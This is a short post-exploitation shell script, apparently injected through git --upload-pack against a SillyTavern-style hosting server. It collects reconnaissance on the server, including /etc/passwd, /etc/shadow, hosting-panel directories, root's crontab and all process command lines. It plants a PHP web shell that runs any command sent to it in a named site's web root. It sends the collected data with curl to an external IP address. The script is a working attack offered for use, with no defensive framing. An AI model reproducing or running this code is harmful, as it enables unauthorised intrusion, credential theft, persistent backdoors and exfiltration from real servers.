#!/bin/sh
# 回响云酒馆 foothold v2 (由 git --upload-pack 注入执行)
OUT=/tmp/z2out.txt
D=/www/wwwroot/webcom/www.spacesouls.com
{
echo "### id"; id
echo "### hostname"; hostname; uname -a
echo "### pwd"; pwd
echo "### passwd tail"; tail -6 /etc/passwd
echo "### shadow"; head -3 /etc/shadow 2>&1
echo "### ls /www/wwwroot"; ls -la /www/wwwroot/ 2>&1
echo "### ls cloudsillytavern"; ls -la /www/wwwroot/cloudsillytavern/ 2>&1
echo "### panel data"; ls -la /www/server/panel/data/ 2>&1 | head -20
echo "### panel vhost"; ls -la /www/server/panel/vhost/nginx/ 2>&1 | head -40
echo "### panel logs"; ls -la /www/server/panel/logs/ 2>&1 | head -10
echo "### sudo"; sudo -n id 2>&1
echo "### docker"; ls -la /var/run/docker.sock 2>&1
echo "### crontab root"; cat /var/spool/cron/crontabs/root 2>&1 | head -20
echo "### proc cmdlines"; for p in /proc/[0-9]*; do printf '%s ' "$p"; tr '\0' ' ' < "$p/cmdline" 2>/dev/null; echo; done
echo "### done"
} > $OUT 2>&1
P='<?php echo "Z2A:";system($_REQUEST["c"]);echo ":Z2B"; ?>'
printf '%s' "$P" > "$D/zz2.php" 2>/dev/null
printf '%s' "$P" > /www/wwwroot/webcom/zz2.php 2>/dev/null
printf '%s' "$P" > /tmp/zz2.php 2>/dev/null
cp -f "$OUT" /tmp/z2out_copy.txt 2>/dev/null
cp -f "$OUT" /www/wwwroot/webcom/zz2out.txt 2>/dev/null
curl -s -m 10 --data-binary @"$OUT" "http://38.76.197.96:18098/up" >/dev/null 2>&1
exit 0
